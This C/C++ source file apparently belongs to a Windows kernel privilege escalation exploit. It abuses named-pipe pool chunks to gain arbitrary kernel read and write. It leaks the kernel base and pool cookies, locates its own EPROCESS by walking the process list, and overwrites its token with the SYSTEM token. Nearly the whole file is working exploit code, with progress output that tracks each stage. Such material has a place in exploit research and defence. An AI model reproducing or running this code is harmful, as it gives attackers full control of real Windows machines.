#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <cstdint>

#include "core/privilege_escalation.h"

#include "core/cleanup.h"
#include "primitives/arbitrary_read.h"
#include "primitives/arbitrary_decrement.h"
#include "primitives/arbitrary_write.h"
#include "windows_api/windows_api.h"

uintptr_t findKernelBase(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs)
{
    uintptr_t ghost_np_data_queue_entry;
    ArbitraryRead(ghost_pipe, addrs->np_ccb_data_queue, (char*)&ghost_np_data_queue_entry, 0x8);
    printf("[+] ghost_np_data_queue_entry: 0x%llX\n", ghost_np_data_queue_entry);

    addrs->ghost_vs_chunk = ghost_np_data_queue_entry - sizeof(POOL_HEADER) - sizeof(HEAP_VS_CHUNK_HEADER);
    printf("[+] ghost_vs_chunk: 0x%llX\n", addrs->ghost_vs_chunk);

    uintptr_t file_object;
    ArbitraryRead(ghost_pipe, addrs->np_ccb_data_queue - NP_CCB_DataQueue_OFFSET + NP_CCB_FileObject_OFFSET, (char*)&file_object, 0x8);
    printf("[+] FILE_OBJECT: 0x%llX\n", file_object);

    uintptr_t device_object;
    ArbitraryRead(ghost_pipe, file_object + FILE_OBJECT_DeviceObject_OFFSET, (char*)&device_object, 0x8);
    printf("[+] DEVICE_OBJECT: 0x%llX\n", device_object);

    uintptr_t driver_object;
    ArbitraryRead(ghost_pipe, device_object + DEVICE_OBJECT_DriverObject_OFFSET, (char*)&driver_object, 0x8);
    printf("[+] DRIVER_OBJECT: 0x%llX\n", driver_object);

    uintptr_t npfs_base;
    ArbitraryRead(ghost_pipe, driver_object + DRIVER_OBJECT_DriverStart_OFFSET, (char*)&npfs_base, 0x8);
    printf("[+] DriverStart (Npfs): 0x%llX\n", npfs_base);

    uintptr_t ExAllocatePoolWithTag_ptr = npfs_base + Npfs_imp_ExAllocatePoolWithTag_OFFSET;
    uintptr_t ExAllocatePoolWithTag;
    ArbitraryRead(ghost_pipe, ExAllocatePoolWithTag_ptr, (char*)&ExAllocatePoolWithTag, 0x8);
    printf("[+] nt!ExAllocatePoolWithTag: 0x%llX\n", ExAllocatePoolWithTag);

    uintptr_t kernel_base = ExAllocatePoolWithTag - nt_ExAllocatePoolWithTag_OFFSET;
    return kernel_base;
}

uintptr_t findSelfEprocess(pipe_pair_t* ghost_pipe, uintptr_t system_eprocess)
{
    DWORD self_pid = GetCurrentProcessId();
    printf("[*] Searching for current process (PID: %d) in the process list...\n", self_pid);

    uintptr_t current_eprocess = system_eprocess;
    do
    {
        ArbitraryRead(ghost_pipe, current_eprocess + EPROCESS_ActiveProcessLinks_OFFSET, (char*)&current_eprocess, 0x8);
        current_eprocess -= EPROCESS_ActiveProcessLinks_OFFSET;

        uintptr_t current_pid = 0;
        ArbitraryRead(
            ghost_pipe,
            current_eprocess + EPROCESS_UniqueProcessId_OFFSET,
            (char*)&current_pid, 0x8);

        if (current_pid == self_pid)
        {
            return current_eprocess;
        }

    } while (current_eprocess != system_eprocess);

    fprintf(stderr, "[-] Failed to locate EPROCESS structure for current process (PID: %d)\n", self_pid);
    return NULL;
}

int leakKernelInfo(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs)
{
    uintptr_t kernel_base = findKernelBase(ghost_pipe, addrs);
    addrs->kernel_base = kernel_base;
    printf("[+] Kernel Base: 0x%llX\n", kernel_base);

    ArbitraryRead(ghost_pipe, kernel_base + nt_ExpPoolQuotaCookie_OFFSET, (char*)&addrs->ExpPoolQuotaCookie, 0x8);
    printf("[+] ExpPoolQuotaCookie: 0x%llX\n", addrs->ExpPoolQuotaCookie);

    ArbitraryRead(ghost_pipe, addrs->kernel_base + nt_RtlpHpHeapGlobals_OFFSET, (char*)&addrs->RtlpHpHeapGlobals, 0x8);
    printf("[+] RtlpHpHeapGlobals: 0x%llx\n", addrs->RtlpHpHeapGlobals);

    ArbitraryRead(ghost_pipe, kernel_base + nt_PsInitialSystemProcess_OFFSET, (char*)&addrs->system_eprocess, 0x8);
    printf("[+] PsInitialSystemProcess: 0x%llX\n", addrs->system_eprocess);

    addrs->self_eprocess = findSelfEprocess(ghost_pipe, addrs->system_eprocess);
    printf("[+] Self EPROCESS: 0x%llX\n", addrs->self_eprocess);

    ArbitraryRead(ghost_pipe, (uintptr_t)(addrs->self_eprocess + EPROCESS_ThreadListHead_OFFSET), (char*)&addrs->self_kthread, 8);
    addrs->self_kthread -= KTHREAD_ThreadListEntry_OFFSET;
    printf("[+] Self KTHREAD: 0x%llX\n", addrs->self_kthread);

    return 1;
}

int SetupPrimitives(exploit_addresses_t* addrs)
{
    exploit_pipes_t pipes = { 0 };

    puts("## 1.1 Setting up arbitrary read primitive\n");
    if (!SetupArbitraryRead(&pipes, addrs))
    {
        fprintf(stderr, "[-] Failed to set up arbitrary read primitive\n");
        return 0;
    }

    puts("\n## 1.2 Extracting critical kernel information\n");
    if (!leakKernelInfo(&pipes.ghost_chunk_pipe, addrs))
    {
        fprintf(stderr, "[-] Failed to extract kernel info\n");
        return 0;
    }

    puts("\n## 1.3 Setting up arbitrary decrement primitive\n");
    if (!SetupArbitraryDecrement(&pipes, addrs))
    {
        fprintf(stderr, "[-] Failed to set up arbitrary decrement\n");
        return 0;
    }

    puts("\n## 1.4 Setting up arbitrary write primitive\n");
    if (!SetupArbitraryWrite(&pipes, addrs))
    {
        fprintf(stderr, "[-] Failed to set up arbitrary write\n");
        return 0;
    }

    puts("\n## 1.5 Fixing VS chunk headers\n");
    if (!FixVsChunkHeaders(addrs))
    {
        fprintf(stderr, "[-] VS chunk headers fix failed\n");
        return 0;
    }

    puts("\n## 1.6 Cleaning up pipes\n");
    if (!CleanupPipes(&pipes))
    {
        fprintf(stderr, "[-] Pipes cleanup failed\n");
        return 0;
    }

    return 1;
}

int EscalatePrivileges(exploit_addresses_t* addrs)
{
    uintptr_t system_token = Read64(addrs->system_eprocess + EPROCESS_Token_OFFSET);
    system_token &= (~0xF); // Clear reference count bits
    printf("[+] System TOKEN: 0x%llX\n", system_token);

    puts("[*] Overwriting current process token with System token");
    Write64(addrs->self_eprocess + EPROCESS_Token_OFFSET, system_token);

    return 1;
}
